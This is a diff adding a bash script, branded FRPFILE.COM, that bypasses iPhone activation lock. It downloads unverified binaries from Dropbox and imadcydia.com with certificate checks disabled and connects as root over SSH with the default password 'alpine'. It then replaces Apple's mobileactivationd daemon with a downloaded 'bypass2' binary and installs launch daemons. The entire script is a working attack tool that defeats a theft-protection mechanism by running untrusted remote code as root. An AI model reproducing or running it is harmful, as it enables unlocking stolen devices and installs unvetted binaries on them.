@@ -1,0 +1,54 @@
+#!/bin/bash
+
+clear 
+
+rm -rf ~/.ssh/known_hosts
+echo "==========> Setting up SSH over USB..."
+iproxy 2233 44 2> /dev/null &
+
+runcmd () {
+    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2233 "$1" > /dev/null
+}
+echo
+echo "************************************************************"
+echo "*                       FRPFILE.COM                        *"
+echo "************************************************************"
+echo
+
+# read -p "==> Please make sure your device has Jailbreak... Connect your device to Mac, then press Enter "
+
+wget --no-check-certificate https://www.dropbox.com/s/olmnrrcfwitn5uh/bypass2?dl=0 -O ./bypass2
+wget --no-check-certificate http://imadcydia.com/bypass/iTunesPatch.rtf ./iTunesPatch.rtf
+wget --no-check-certificate https://imadcydia.com/bypass/ByRemote2/sshpass ./sshpass
+wget --no-check-certificate http://imadcydia.com/bypass/ByRemote2/mobileact ./mobileact
+wget --no-check-certificate https://imadcydia.com/bypass/ByRemote2/com.iro.mobileact.plist ./com.iro.mobileact.plist
+
+chmod 755 ./sshpass 
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mount -o rw,union,update /
+
+./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./bypass2 root@localhost:/usr/libexec/bypass2
+
+./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./iTunesPatch.rtf root@localhost:/var/mobile/Media/Downloads/iTunesPatch.rtf
+
+./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./mobileact root@localhost:/etc/mobileact
+
+./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/System/Library/LaunchDaemons/com.iro.mobileact.plist
+
+./sshpass -p "alpine" scp -rP 2233 -o StrictHostKeyChecking=no ./com.iro.mobileact.plist root@localhost:/Library/LaunchDaemons/com.iro.mobileact.plist
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mv /usr/libexec/mobileactivationd /usr/libexec/mobileactivationdbak
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 mv /usr/libexec/bypass2 /usr/libexec/mobileactivationd
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 chmod 755 /usr/libexec/mobileactivationd
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 cat /var/mobile/Media/Downloads/iTunesPatch.rtf
+
+./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2233 rm /var/mobile/Media/Downloads/iTunesPatch.rtf
+
+echo "[*] Success Terminado."
